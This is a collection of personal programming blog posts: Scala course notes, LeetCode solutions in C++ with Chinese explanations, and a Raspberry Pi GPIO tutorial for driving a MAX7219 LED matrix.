    <content type="text"><![CDATA[Note:This blog is intended to record what I learned in Functional Programming Principles in Scala, rather than sharing the course materials. So there are two things that I won’t put up: my solution to assignments and topics which I’ve mastered already. Week 1Lecture 1.1 - Programming Paradigms three main programming paradigms: imperative programming, functional programming and logic programming. (object-oriented programming is orthogonal to them) the largest problem of imperative programming is not suitable for scaling up (limited by the Von Neuman bottleneck). FP = focusing on functions (wider sence, Scala); programming without mutable variables, assignments and imperative control structures (restricted sence, Pure Lisp). functions are first-class citizens in a FP language, which means you can do with a function that you could do with any other piece of data. recommended books: SICP (more about functional programming), Programming in Scala (more about Scala), Scala for the Impatient (for people with a Java background), Scala in Depth (a bit further than others). benefits of FP: simpler reasoning princples, better modularity, good for exploiting parallelism for multicore and cloud computing. Lecture 1.2 - Elements of Programming evaluation of function applications: 1. evaluate all arguments, from left to right; 2. replace function by its right-hand side, and at the same time; 3. replace the formal arguments by the actual arguments. substitution model: scheme of expression evaluation (formaized in the $\lambda-calculas$, which is the foundation of FP). call-by-value and call-by-name: both strategies reduce to the same final value as long as: the reduced expression consists of pure functions and both evaluations terminate. call-by-value: reduces arguments to values before rewriting the function application; evaluate every argument only once. call-by-name: apply the function to unreduced arguments; an argument won’t be evaluated when it’s unused in the evaluation of the function body. Lecture 1.3 - Evaluation Strategies and Temination if call-by-value evaluation of an expression terminates, then call-by-name terminates too. the other direction is not true Scala uses call-by-value by default; But if the type of a function parameter starts with =&gt;, it uses call-by-name.1def foo(x: Int, y: =&gt; Int): Int = x Lecture 1.4 - Conditionals and Value Definitions the def form is by-name (evaluated on each use); val is by-value. Lecture 1.5 - Example: Square roots with Newton’s methodLecture 1.6 - Blocks and Lexical Scope if there are more than one statements on a line, they need to be separated by semicolons. how to write expressions that span several lines: write the multi-line expression in parentheses, because semicolons are never inserted inside (…). write the operator on the first line, because this tells the Scala compiler that the expression is not yet finished.12a +b Lecture 1.7 - Tail Recursion tail recursion: if a function calls itself as its last action, the function’s stack frame can be reused. we can require a function is tail-recursive using a @tailrec annotation. Week 2Lecture 2.1 - High-Order Functions functional languages treat functions as first-class values. higher order functions: functions that take other functions as parameters or return other functions as results. anonymous functions: function literals. Lecture 2.2 - Currying - Principles of Functional Programming the type of sum is (Int =&gt; Int) =&gt; (Int, Int) =&gt; Int: 1def sum(f: Int =&gt; Int)(x: Int, y: Int): Int = ... function types associate to the right, so Int =&gt; Int =&gt; Int is equivalent to Int =&gt; (Int =&gt; Int). Lecture 2.3 - Example: Finding Fixed PointsLecture 2.4 - Scala Syntax Summary12345678910111213141516171819202122232425Type = SimpleType | FunctionTypeFunctionType = SimpleType ‘= &gt; ’ Type | ‘( ’ [ Types ] ‘) ’ ‘= &gt; ’ TypeSimpleType = IdentTypes = Type &#123; ‘ , ’ Type &#125;Expr = InfixExpr | FunctionExpr | if ‘( ’ Expr ‘) ’ Expr else ExprInfixExpr = PrefixExpr | InfixExpr Operator InfixExprOperator = identPrefixExpr = [ ‘+ ’ | ‘-’ | ‘! ’ | ‘~ ’ ] SimpleExprSimpleExpr = ident | literal | SimpleExpr ‘. ’ ident | BlockFunctionExpr = Bindings ‘= &gt; ‘ ExprBindings = ident [ ‘: ’ SimpleType ] | ‘( ’ [ Binding &#123; ‘ , ’ Binding &#125;] ‘) ’Binding = ident [ ‘: ’ Type ]Block = ‘&#123; ’ &#123; Def ‘; ’&#125; Expr ‘&#125; ’Def = FunDef | ValDefFunDef = def ident &#123; ‘( ’ [ Parameters ] ‘) ’&#125; [ ‘: ’ Type ] ‘= ’ ExprValDef = val ident [ ‘: ’ Type ] ‘= ’ ExprParameter = ident ‘: ’ [ ‘= &gt; ’ ] TypeParameters = Parameter &#123; ‘ , ’ Parameter &#125; Lecture 2.5 - Functions and DataLecture 2.6 - More Fun With Rationals data abstraction: the ability to choose different implementation of the data without affecting clients. require and assert: require is used to enforce a precondition on the caller of a function, while assert is used as to check the code of the function itself. Lecture 2.7 - Evaluation and Operators the precedence of an operator is determined by its first character, and the following table lists the characters in increasing order of priority precedence: 12345678910(all letters)|^&amp;&lt; &gt;= !:+ -* / %(all other special characters) exercise: 123a + b ^? c ?^ d less a ==&gt; b | c// is equivalent to((a + b) ^? (c ?^ d)) less ((a ==&gt; b) | c) Week 3Lecture 3.1 - Class Hierarchies abstract classes can contain members which are missing an implementation. no instances of an abstract class can be created with new. dynamic dispatch of methods (in Object-Oriented Language) is analogous to calls to higher-order functions (in Functional Languages): because the code thats gets executed on functional method call is not known statically, but it’s determined by the runtime value that is passed. Lecture 3.2 - How Classes Are Organized a class can only have one superclass, but it could extends multiple traits. trait can contains fields and concrete methods, but it cannot have parameters. Null is a subtype of every class that inherits from Object; it is incompatible with subtypes of AnyVal. Lecture 3.3 - Polymorphism type parameters do not affect evaluation in Scala. type erasure: we can assume that all type parameters and type arguments are removed before evaluating the program. languages that use type erasure: Scala, Java, Haskell, ML, Ocaml. languages that keep the type parameters around run time: C++, C#, F#. polymorphsim has two principal forms: subtyping and generics: subtyping: instances of a subclass can be passed to a base class. generics: instances of a class or function are created by type parameterization. Week 4Lecture 4.1 - Objects Everywhere a pure object oriented language is one which every value is an object. define Boolean as a class from first principles:12345678910111213141516package idealized.scalaabstract class Boolean &#123; def ifThenElse[T](t: =&gt; T, e: =&gt; T): T def &amp;&amp; (x: =&gt; Boolean): Boolean = ifThenElse(x, false) def || (x: =&gt; Boolean): Boolean = ifThenElse(true, x) def unary_!: Boolean = ifThenElse(false, true) def == (x: Boolean): Boolean = ifThenElse(x, x.unary_!) def != (x: Boolean): Boolean = ifThenElse(x.unary_!, x)&#125;object true extends Boolean &#123; def ifThenElse[T](t: =&gt; T, e: =&gt; T) = t&#125;object false extends Boolean &#123; def ifThenElse[T](t: =&gt; T, e: =&gt; T) = e&#125; Lecture 4.2 - Functions as Objects function values are treated as objects in Scala: the function type A =&gt; B is just an abbreviation for class scala.Function1[A, B]. Lecture 4.3 - Subtyping and Generics A &lt;: B is an upper bound of the type parameter A which means A is a subtype of B. A &gt;: B is an lower bound of the type parameter A which means A is a supertype of B. mixed bound is possible: A &gt;: B &lt;: C would restrict A any type on the interval between B and C. Liskov Substitution Principle: let q(x) be a property provable about objects x of type B, then q(y) should be provable for objects y of type A where A &lt;: B Lecture 4.4 - Variance (Optional) (roughly speaking) a type that accepts mutations of its elements should not be covariant, but immutable types can be covariant if some conditions are met. covariant and contravariant: given A &lt;: B, if C[A] &lt;: C[B], C is covariant; if C[A] &gt;: C[B], C is covariant; if neither C[A] nor C[B] is a subtype of the other, C is nonvariant.123class C[+A] &#123; ... &#125; // C is covariantclass C[-A] &#123; ... &#125; // C is contravariantclass C[A] &#123; ... &#125; // C is nonvariant functions must be contravariant in their argument types and covariant in their result types: for a function, if A2 &lt;: A1 and B1 &lt;: B2, then A1 =&gt; B1 &lt;: A2 =&gt; B2. covariant type parameters can only appear in method results. contravariant type parameters can only appear in method parameters. invariant type parameters can appear anywhere. sometimes we have to put in a bit of work to make a class covariant. 12345678trait List[+T] &#123; // the following code does not type-check because T is covariant. // List[IntSet].prepend(Empty) works but List[NonEmpty].prepend(Empty) does not work. def prepend(elem: T): List[T] = new Cons(elem, this) // we can use a lower bound to solve this problem. def prepend [U &gt;: T] (elem: U): List[U] = new Cons(elem, this)&#125; Lecture 4.5 - DecompositionLecture 4.6 - Pattern Matching pattern matching is a generalization of switch from C/Java to class hierarchies. a constructor pattern C(p1, ..., pn) matches all the values of type C (or a subtype) that have been constructed with arguments matching the patterns p1, ..., pn. a variable pattern x matches any value, and binds the name of the variable to this value. a constant pattern c matches values that are equal to c (in the sense of ==) Lecture 4.7 - Lists lists are immutable; lists are recursive, while arrays are flat. like arrays, lists are homogeneous that all elements of a list must all have the same type. operators ending in : associate to the right. Week 5Lecture 5.1 - More Functions on ListsLecture 5.2 - Pairs and TuplesLecture 5.3 - Implicit Parameters scala.math.Ordering[T] provides ways to compare elements of type T. if a function takes an implicit parameter of type T, the compiler will search an implicit definition that: is marked implicit. has a type compatible with T. is visible at the point of the function call, or is defined in a companion object associated with T. if there is a single (most specific) definition, it will be taken as actual argument for the implicit parameter; otherwise it’s an error. Lecture 5.4 - High-Order List FunctionsLecture 5.5 - Reduction of Lists reduceLeft inserts a given binary operator between adjacent elements of a list. foldLeft is like reduceLeft but takes an accumalator. foldLeft and reduceLeft produces trees which lean to the left, while foldRight and reduceRight produces trees which lean to the right. Lecture 5.6 - Reasoning About ConcatLecture 5.7 - A Larger Equational Proof on ListsWeek 6Lecture 6.1 - Other Collections Vector has more evenly balanced access patterns than List based on its structure design. a common base class of List and Vector is Seq, the class of all sequences, which is a subclass of Iterable. 1234Seq, Set, Map &lt;: IterableVector, List, Range &lt;: Seq// Array and String support the same operations as Seq and can implicitly be converted to sequences where needed,// but they cannot be subclasses of Seq because they come from Java. Range represents a sequence of evenly spaced integers, which has three operators: to (inclusive), until (exclusive) and by (step value). 1231 to 4 // 1, 2, 3, 41 until 4 // 1, 2, 31 to 4 by 2 // 1, 3 Lecture 6.2 - Combinatorial Search and For-Expressions a for-expression is of the form: for (s) yield e where: s is a sequence of generators or filters, e is an expression whose value is returned by an iteration. a generator is of the form p &lt;- e. a filter is of the form if f. the sequence must start with a generator. if there’re multiple generators in the sequence, the last generators vary faster than the first one. Lecture 6.3 - Combinatorial Search Example Set is different with Seq: Set is unordered. Set does not have duplicate elements. the fundamental operation on Set is contains. Lecture 6.4 - Maps repeated parameter: T* means you can pass variable number of parameter with type T. Lecture 6.5 - Putting the Pieces Together]]></content>

    <content type="text"><![CDATA[题目：You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters. 标签：Hash Table, Two Pointers, String 分析：本题和第3题比较相似，都是采用滑动窗口的思路来求解：维护一前一后两个指针，指针包含的区域即为窗口，始终保证窗口内部的字符串与题目要求不冲突；尽可能地拉伸窗口（即将后指针右移），当窗口内部字符串与题目要求冲突时，通过缩小窗口（右移前指针）来解决冲突。具体地： 首先统计words内各个word的出现次数，生成频率表。 遍历整个字符串， 当word在频率表中可以查到时，将其加入滑动窗口，并累计滑动窗口内每个word的出现次数，如果超过对应频率表中的出现次数，缩小滑动窗口（右移前指针直至该word被移出）； 如果word在频率表中不存在，说明这是一个invalid word，滑动窗口归零，将前指针重置为当前位置，继续遍历； 当滑动窗口大小等于words内所有word的长度之和时，得到题解，存下前指针的位置，然后将前指针右移一格，继续遍历。 需要注意的是，由于所有word等长，且没有交叉字符，因此只需要wordLen（单词长度）轮遍历即可完成任务。 假设word长度为$l$，字符串长度为$n$，计算复杂度为$O(ln)$ 代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class Solution &#123;public: vector&lt;int&gt; findSubstring(string s, vector&lt;string&gt;&amp; words) &#123; if (words.size() == 0) return vector&lt;int&gt;&#123;&#125;; vector&lt;int&gt; res; // count the occurrence number of each word map&lt;string, int&gt; countMap; for (int i = 0; i &lt; (int)words.size(); i++) &#123; if (countMap.find(words[i]) == countMap.end()) countMap[words[i]] = 1; else countMap[words[i]]++; &#125; int wordLen = words[0].length(), totalLen = wordLen * words.size(); /* * All words are of the same length, and * there are no intervening characters. */ for (int i = 0; i &lt; wordLen; i++) &#123; // sliding window int start = i, curr = i; map&lt;string, int&gt; newCount; while (start + totalLen &lt;= (int)s.length()) &#123; string ss = s.substr(curr, wordLen); // current word is invalid if (countMap.find(ss) == countMap.end()) &#123; newCount.clear(); start = curr + wordLen; &#125; else if (newCount.find(ss) != newCount.end()) &#123; newCount[ss]++; // the occurrence number of current word is larger than needed, // slide the `start` pointer until one current word is skipped. if (newCount[ss] &gt; countMap[ss]) &#123; while (start &lt; curr) &#123; string _ss = s.substr(start, wordLen); newCount[_ss]--; start += wordLen; if (_ss == ss) break; &#125; &#125; &#125; else newCount[ss] = 1; curr += wordLen; if (curr - start == totalLen) &#123; res.push_back(start); string _ss = s.substr(start, wordLen); newCount[_ss]--; start += wordLen; &#125; &#125; &#125; return res; &#125;&#125;;]]></content>

If it is overflow, return MAX_INT. 标签：Math, Binary Search, Overflow 分析：题目看起来很简单，但是通过率并不高。首先，单纯地用dividend一直减divisor肯定会超时，其次，实际计算过程中很容易出现overflow的情况，比如，对INT_MIN求绝对值。为了防止算法超时，可以使用移位运算符成倍增大divisor，尽可能逼近dividend，然后将dividend设为dividend - divisor，重复循环。原理与二分查找类似。 代码：12345678910111213141516171819202122232425class Solution &#123;public: int divide(int dividend, int divisor) &#123; if (divisor == 0) return INT_MAX; if (divisor == 1) return dividend; if (divisor == -1) return dividend == INT_MIN?

    <content type="text"><![CDATA[题目：Implement strStr(). Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack. Example 1: Input: haystack = &quot;hello&quot;, needle = &quot;ll&quot; Output: 2 Example 2: Input: haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot; Output: -1 标签：Two Pointers, String, KMP 分析：注意edge case的存在，比如当needle为&quot;&quot;时，结果应该是0，而非-1。最简单的做法是，遍历haystack，当出现与needle[0]匹配的字符时，进入匹配循环，如果匹配成功，即可返回当前索引；如果匹配失败，继续遍历。这种算法在最差情况下的复杂度为$O(MN)$（假设needle、haystack长度分别为$m$、$n$）。具体的改进方法有两种： 使用双指针：当找到与needle[0]匹配的字符时，使用两个指针分别从needle头部、尾部同时匹配，当指针出现交叉时，匹配结束。这种方法相较于原始方法，在某些情况下有很大改进，不妨试想haystack=&quot;111...11&quot;、needle=&quot;111..12&quot;的场景。 KMP算法：注意到，无论是原始方法，还是改进的双指针算法，它们都存在着“信息浪费”的情况，即匹配过程中，我们其实已经对haystack进行了一段距离的遍历，但是匹配结束后，我们并没有对遍历结果加以利用，而是重新开始了新的遍历+匹配。KMP算法很巧妙地利用了prefix=suffix的特征，允许我们在匹配结束后，省去一段距离的遍历。具体算法原理在之后的post中会详细说明。 代码：1234567891011121314151617181920212223class Solution &#123;public: // using two pointers int strStr(string haystack, string needle) &#123; if (needle.length() &gt; haystack.length()) return -1; if (needle == "") return 0; int len = needle.length(), start, end; for (int i = 0; i &lt; (int)haystack.length(); i++) &#123; if (needle[0] == haystack[i]) &#123; start = i+1; end = i + len - 1; // start matching from both sides. if (end &gt;= (int)haystack.length()) break; while (start &lt;= end) &#123; if (haystack[start] != needle[start-i] || haystack[end] != needle[end-i]) break; start++; end--; &#125; if (start &gt; end) return i; &#125; &#125; return -1; &#125;&#125;;]]></content>

A mapping of digit to letters (just like on the telephone buttons) is given below. 标签：String, Backtracking 分析：本题有多种不同解法: 为了求解长度为n的电话号码所对应的字母组合，我们可以先计算出后n-1位的所有字母组合，然后再与第1位数字对应的多个字母进行组合，如此递归即可求得最终解。这种解法思路比较直观，需要产生n次函数调用，但每次递归结束需要遍历中间结果（vector），然后与当前数字的多个数字进行组合。 采用回溯法，基于深度优先对所有数字进行遍历。产生约$3^n$次函数调用，但是减少了vector的构造、回收与遍历。 代码：1234567891011121314151617181920212223242526272829// backtrackingclass Solution &#123;public: char lookupTable[10][4] = &#123; &#123;&#125;, &#123;&#125;, &#123;'a','b','c'&#125;, &#123;'d','e','f'&#125;, &#123;'g','h','i'&#125;, &#123;'j','k','l'&#125;, &#123;'m','n','o'&#125;, &#123;'p','q','r','s'&#125;, &#123;'t','u','v'&#125;, &#123;'w','x','y','z'&#125; &#125;; int length[10] = &#123; 0, 0, 3, 3, 3, 3, 3, 4, 3, 4 &#125;; vector&lt;string&gt; letterCombinations(string digits) &#123; if (digits.length() == 0) return vector&lt;string&gt;&#123;&#125;; vector&lt;string&gt; res; string init; backtrack(init, res, digits, 0); return res; &#125; void backtrack(string&amp; prev, vector&lt;string&gt;&amp; res, string&amp; digits, int index) &#123; if (index == (int)digits.length()) res.push_back(prev); else &#123; int num = digits[index] - '0'; for (int i = 0; i &lt; length[num]; i++) &#123; prev.push_back(lookupTable[num][i]); backtrack(prev, res, digits, index+1); prev.pop_back(); &#125; &#125; &#125;&#125;;]]></content>

    <content type="text"><![CDATA[题目：Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution. For example, given array S = {-1 2 1 -4}, and target = 1. The sum that is closest to the target is 2. (-1 + 2 + 1 = 2). 标签：Array, Two Pointers 分析：和15题类似，同样采取固定a，然后求解b、c的最优解，区别在于，这里只需要返回三数之和，因此实际上题目更简单了。容易出错的点主要是一些临界数据，比如数列刚好仅有三个数时，如果没有做好初始化工作，答案就会出错。 代码：123456789101112131415161718192021222324252627282930class Solution &#123;public: // find a, b, c whose sum is closest to target and return their sum. int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) &#123; if ((int)nums.size() &lt; 3) // return immediately. return 0; sort(nums.begin(), nums.end()); // sort the array to ensure a &lt; b &lt; c. int res = nums[0] + nums[1] + nums[2]; // initialize result. for (int i = 0; i &lt; (int)nums.size(); i++) &#123; if (i != 0 &amp;&amp; nums[i] == nums[i-1]) // skip the duplicate a. continue; int bPlusC = target - nums[i]; int j = i + 1, k = (int)nums.size() - 1; while (j &lt; k) &#123; int sum = nums[j] + nums[k]; int delta = sum - bPlusC; if (abs(delta) &lt; abs(target - res)) // whether closer to target than previous sum. res = sum + nums[i]; if (delta &lt; 0) j++; // b + c &lt; 0 - a, so increase b. else if (delta &gt; 0) k--; // b + c &gt; 0 - a, so decrease c. else return res; // b + c = 0 - a, best answer. &#125; &#125; return res; &#125;&#125;;]]></content>

    <content type="text"><![CDATA[题目：Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero. Note: The solution set must not contain duplicate triplets. 标签：Array, Two Pointers 分析：比较直观的解法是三个嵌套循环直接暴搜解法，最后去重，计算复杂度为$O(n^3)$，不过，暴力枚举过程中存在着大量可以省略的重复计算工作，存在很大的优化空间，事实上最终的优解复杂度仅有$O(n^2)$而已。 首先，将三数和归纳为二数和的求解，即固定一个数a，然后在剩余的数中求解b和c；需要注意的是，a是一次性的，在对a求解完b、c的组合后，a就不需要再被用到；对所有数依次固定求解完之后，再去除重复解，并排序。复杂度为$O(n^2)$（因为二数和求解是$O(n)$） 可以首先对整个数列进行排序，通过假设a &lt; b &lt; c来简化计算；具体为，每次固定完数a后，我们只需要往后搜索b、c的解法（参见代码14行），因为a前面的数已经全部被求解过一遍了。 题目要求最后不能有重复解，不建议在最后进行去重，完全可以在计算过程中进行避免；由于数列已经经过排序，所有相同的数一定分在一块，因此，只需要对连续重复的a求解一次即可（参见代码10行）。 由于假设a &lt; b &lt; c的存在，我们知道a必须小于等于0，因此，可以当a大于0时，可以终止求解过程（参见代码8行）。 最后，由于数列是排好序的，因此二数和可以从两端同时进行计算求解。 最后的最后，尽可能多用中间变量来缓存计算结果（参见代码13、17行），不要在循环内做重复计算，这会对算法运行时间产生不小的影响。 代码：1234567891011121314151617181920212223242526272829303132333435class Solution &#123;public: // try to find all a, b, c where a + b + c = 0 vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; sort(nums.begin(), nums.end()); // sort the number array to ensure a &lt; b &lt; c. vector&lt;vector&lt;int&gt;&gt; res; for (int i = 0; i &lt; (int)nums.size(); i++) &#123; if (nums[i] &gt; 0) // a cannot be positive since both b and c is larger than a. break; if (i != 0 &amp;&amp; nums[i] == nums[i-1]) // skip all duplicate a's. continue; int target = 0 - nums[i]; int j = i+1, k = nums.size() - 1; while (true) &#123; // since the nums array is sorted, we could search from both sides. if (j &gt;= k) break; int bPlusC = nums[j] + nums[k]; if (bPlusC &gt; target) k--; // b + c &gt; 0 - a, so decrease c. else if (bPlusC &lt; target) j++; // b + c &lt; 0 - a, so increase b. else &#123; vector&lt;int&gt; newSol&#123;nums[i], nums[j], nums[k]&#125;; res.push_back(newSol); if (nums[j] == nums[k]) break; // stop since c cannot be smaller than b do &#123; j++; &#125; while (nums[j] == nums[j-1]); // skip the duplicate b do &#123; k--; &#125; while (nums[k] == nums[k+1]); // skip the duplicate c &#125; &#125; &#125; return res; &#125;&#125;;]]></content>

    <content type="text"><![CDATA[Parameterize arrays with types If a method takes only one parameter, you can call it without a dot or parentheses. 123println(123) // equal toConsole.println(123) // equal toConsole println 123 Scala is an object-oriented language in pure form: every value is an object and every operation is a method call. 121 + 2 // actually invoking(1).+(2) When you apply parentheses surrounding one or more values to a variable, Scala will transform the code into an invocation of a method named apply on that variable. It’s a general rule. 1234567val testArray: Array[Int] = new Array[Int](5)testArray(0) // get transformed intotestArray.apply(0)val numNames = Array("zero", "one", "two")// get transformed intoval numNames2 = Array.apply("zero", ...) Similarly, when an assignment is made to a variable to which parentheses and on e or more arguments have been applied, the compiler will transform that into an invocation of an update method that takes the arguments in parentheses as well as the object to the right of the equals sign. 12testArray(0) = "hello" // get transformed intotestArray.update(0, "hello") Use lists List is immutable in Scala. It has a method named ::: for list concatenation. 1List(1, 2) ::: List(3, 4) == List(1, 2, 3, 4) We can also use ::(pronounced cons) to prepends a new element to the beginning of an existing list and returns the resulting list. Here :: is a method of its right operand.(If a method is used in operator notation, such as a * b, the method is invoked on the left operand, as in a.*(b)——unless the method name ends in a colon) 1234561 :: List(2, 3) == List(1, 2, 3)// get transformed intoList(2, 3).::(1)val oneTwoThree = 1 :: 2 :: 3 :: Nil// here Nil is an empty list The time it takes to append to a list grows linearly with the size of the list, whereas prepending with :: takes constant time. If you want to build a list efficiently by appending elements, you can prepend them and call reverse, or use ListBuilder. Use tuples The actual type of a tuple depends on the number of elements it contains and the types of those elements. Thus, the type of (99, &quot;Luftballons&quot;) is Tuple2[Int, String]. The _N numbers for accessing the elements of a tuple are one-based, instead of zero-based, because starting with 1 is a tradition set by other languages with statically typed tuples. Use sets and maps The Scala API contains a base trait for sets, where a trait is similar to a Java interface. Scala then provides two subtraits, one for mutable sets and another for immutable sets. Method -&gt;, which you can invoke on any object in a Scala program, returns a two-element tuple containing the key and value. 123someMap += (1 -&gt; "hello") // get transformed intosomeMap += (1).-&gt;("hello")someMap += ((1, "hello")) Classes, fields, and methods One important characteristic of method parameters in Scala is that they are vals, not vars. Never reassign a parameter inside a method in Scala. In the absence of any explicit return statement, a Scala method returns the last value computed by the method. The recommended style for methods is in fact to avoid having explicit, and especially multiple, return statements. Instead, think of each method as an expression that yields one value. Singleton objects When a singleton object shares the same name with a class, it is called that class’s companion object. You must define both the class and its companion object in the same source file. A class and its companion object can access each other’s private members. A singleton object that does not share the same name with a companion class is called a standalone object. Symbol literals Symbols are interned in Scala, which means that if you write the same symbol literal twice, both expressions will refer to the exact same Symbol object. String interpolation In Scala, string interpolation is implemented by rewriting code at compile time. Any method can be an operator infix operator notation 12s.indexOf('a') == s indexOf 'a's.indexOf('a', 3) == s indexOf ('a', 3) prefix operator notation 1-2.0 == (2.0).unary_- postfix operator notation 1s.toLowerCase == s toLowerCase In Scala, you can leave off empty parentheses on method calls. The convention is that you include parentheses if the method has side effects, such as println(), but you can leave them off if the method has no side effects, such as toLowerCase invoked on a String. Operator precedence and tivity The associativity rule also plays a role when multiple operators of the same precedence appear side by side. If the methods end in : they are grouped right to left; otherwise, they are grouped left to right. For example, a ::: b ::: c is treated as a ::: (b ::: c). But a * b * c, by contrast, is treated as (a * b) * c. Value of assignment In Java or C, assignments result in the value assigned, while in Scala, assignments always result in the unit value, ().123while ((line = readline()) != "") &#123; // wrong // do something&#125; Here line = readline() will always be () and can never be &quot;&quot;. Exception handling with try expressions try-catch-finally results in a value. The result is that of the try clause if no exception is thrown, or the relevant catch clause if an exception is throw and caught. If an exception is thrown but not caught, the expression has no result at all. The value computed in the finally clause, if there is one, is dropped. As in Java, if a finally clause includes an explicit return statement, or throws an exception, that return value or exception will “overrule” any previous one that originated in the try block or one of its catch clauses. 12def f(): Int = try return 1 finally return 2 // f() == 2def g(): Int = try 1 finally 2 // g() == 1 Short forms of function literals This is called target typing because the targeted usage of an expression(in this case, an argument to someNumber.filter()) is allowed to influence the typing of that expression(in this case to determine the type of the x parameter).123val someNumbers = List(-11, -10, -5, 0, 5, 10)someNumbers.filter((x: Int) =&gt; x &gt; 0)someNumbers.filter(x =&gt; x &gt; 0) Placeholder syntax We can use underscores as placeholders for one or more parameters, so long as each parameter appears only one time within the function literal.1someNumbers.filter(_ &gt; 0) Repeated parameters Scala allows you to indicate that the last parameter may be repeated as below. Thus, the type of args inside the echo function, which is declared as type String* is actually Array[String]. Nevertheless, an array cannot be passed as a repeated parameter. 123def echo(args: String*) = args.map(println)val arr = Array("hello", "world", "hac")echo(arr) // compiler error To accomplish this, you’ll need no append the array argument with a colon and an _* symbol as below. This notation tells the compiler to pass each element of array as its own argument to echo, rather than all of it as a single argument. 1echo(arr: _*) Tail call optimization We can turn tail call optimization off by giving the following argument to the scala shell or to the scalac compiler. 1-g:notailcalls Scala only optimizes directly recursive calls back to the same function making the call. If the recursion is indirect, as in the following example of two mutually recursive functions, no optimization is possible: 1234def isEven(x: Int): Boolean = if (x == 0) true else isOdd(x - 1)def isOdd(x: Int): Boolean = if (x == 0) false else isEven(x - 1) You also won’t get a tail-call optimization if the final call goes to a function value. Tail-call optimization is limited to situations where a method or nested function calls itself directly as its last operation, without going through a function value or some other intermediary. 1234val funValue = nextedFun _def nestedFun(x: Int): Unit = &#123; if (x != 0) &#123; println(x); funValue(x - 1) &#125;&#125; Evaluation strategies There are two evaluation strategies in Scala: call by name and call by value. 123456def loop: Any = loop // never terminatedef foo(x: Any, y: Any) = x // call by valuedef goo(x: Any, y: =&gt; Any) = x // call by namefoo(2, loop) // never terminategoo(2, loop) = 2 The def form is call by name, which means that its right hand side is evaluated on each use. However, the val form is call by value. Unary operator We override unary operator by using unary_{operator}.1def unary_- : T = this.negative Class hierarchy There are 9 value classes in Scala: Byte, Short, Char, Boolean, Int, Long, Float, Double, Unit. You cannot create instances of these classes using new. Instead, all instances of these classes are written as literals. This is enforced by the “trick” that value classes are all defined to be both abstract and final. Trait You can do anything in trait definition that you can do in a class definition, and the syntax looks exactly the same, with only two exceptions. A trait cannot have any “class” parameters. In classes, super call is statically bound, while in traits, super calls are dynamically bound. Import In scala, an import selector can consist of the following: A simple name x. This includes x in the set of imported names. A renaming clause x =&gt; y. This makes the member named x visible under the name y. A hiding clause x =&gt; _. This excludes x from the set of imported names. A catch-all _. This imports all members except those members mentioned in a preceding clause. If a catch-all is given, it must come last in the list of import selectors. Access modifiers Java permits an outer class to access the private members of its inner classes, while Scala not. Access to protected members in Scala is also a bit more restrictive than in Java. In Scala, a protected member is only accessible from subclasses of the class in which the member is defined. While in Java, such accesses are also possible from other classes in the same package. Access modifiers can be augmented with qualifiers in Scala. A modifier form private[X] or protect[X] means that access is private or protect up to X, where X designates some enclosing package, class or singleton object. To Be Continued]]></content>

    <content type="text"><![CDATA[在嵌入式Linux中，操作GPIO并不是一件难事，我们可以通过虚拟文件系统或者其他相关库轻易地控制一个引脚的电平。不过当我们需要利用GPIO来控制一个设备时，一切就不再是那么简单了，因为控制引脚电平是一种非常low-level的原始操作，而控制设备行为是一种high-level的语义操作，这之间的巨大鸿沟显示不是普通用户所能填平的，此时就需要程序员出马了。在计算机领域有这么一句话：计算机学科的所有问题都能通过增加一层额外的抽象层来解决，上述问题也不例外，我们可以在用户与设备之间建立一个抽象层，它向用户提供浅显易懂的语义操作，而对下层设备的控制仍是通过GPIO原始操作来完成，这对用户而言是透明的，所以他们不会再因繁琐的GPIO操作而烦恼，上述问题也即得到了解决。 这里提到的抽象层正是本文将要实现的字符设备驱动程序。 设备： - Rraspberry Pi I - MAX7219驱动的8x8 LED矩阵 Start from here 预备知识 在编写设备驱动程序之前，我们需要先把底层GPIO操作打通。这里我们通过sysfs目录中的特殊文件来控制GPIO引脚。 进入/sys/class/gpio/目录，我们需要关注该目录下的两个文件，分别为export和unexport，向export文件中写入引脚编号表示启用该引脚，向unexport文件中写入引脚编号表示停用该引脚。如下所示：123456789101112131415pi@raspberrypi /sys/class/gpio $ ltotal 0-rwxrwx--- 1 root gpio 4096 Jun 4 11:17 exportlrwxrwxrwx 1 root gpio 0 Jun 4 11:17 gpiochip0 -&gt;

writeByte()void writeByte(unsigned char c);void writeData(unsigned char addr, unsigned char data) &#123; write(pinCS, "0", 1); writeByte(addr); writeByte(data); // 先送地址，再送数据 write(pinCS, "1", 1);&#125;void writeByte(unsigned char c) &#123; int i; for (i = 0; i &lt; 8; i++) &#123; write(pinCLK, "0", 1); if (c &amp; 0x80) // 先送最高位 write(pinDIN, "1", 1); else write(pinDIN, "0", 1); write(pinCLK, "1", 1); // 时钟上升沿锁存数据 c &lt;&lt;= 1; // 循环左移 &#125;&#125; 结合MAX7219芯片的驱动方式，上述两个函数应该比较容易理解。实现了上述数据载入函数后，我们对MAX7219芯片的控制就变得非常容易了，直接调用writeData函数向寄存器中写数据即可。123456789101112131415161718192021222324252627282930// main()int main() &#123; pinCS = open("/sys/class/gpio/gpio8/value", O_RDWR); pinDIN = open("/sys/class/gpio/gpio10/value", O_RDWR); pinCLK = open("/sys/class/gpio/gpio11/value", O_RDWR); pinCS_MODE = open("/sys/class/gpio/gpio8/direction", O_RDWR); # GPIO8对应CS引脚 pinDIN_MODE = open("/sys/class/gpio/gpio10/direction", O_RDWR); # GPIO10对应DIN引脚 pinCLK_MODE = open("/sys/class/gpio/gpio11/direction", O_RDWR); # GPIO11对应CLK引脚 write(pinCS_MODE, "out", 3); write(pinDIN_MODE, "out", 3); write(pinCLK_MODE, "out", 3); // 改为输出模式 // 设置控制寄存器，参见预备知识 writeData(0x09, 0x00); writeData(0x0a, 0x00); writeData(0x0b, 0x07); writeData(0x0c, 0x01); writeData(0x0f, 0x00); while (1) &#123; // 输出一个'桃心' writeData(0x01, 0x00); writeData(0x02, 0x6c); writeData(0x03, 0x92); writeData(0x04, 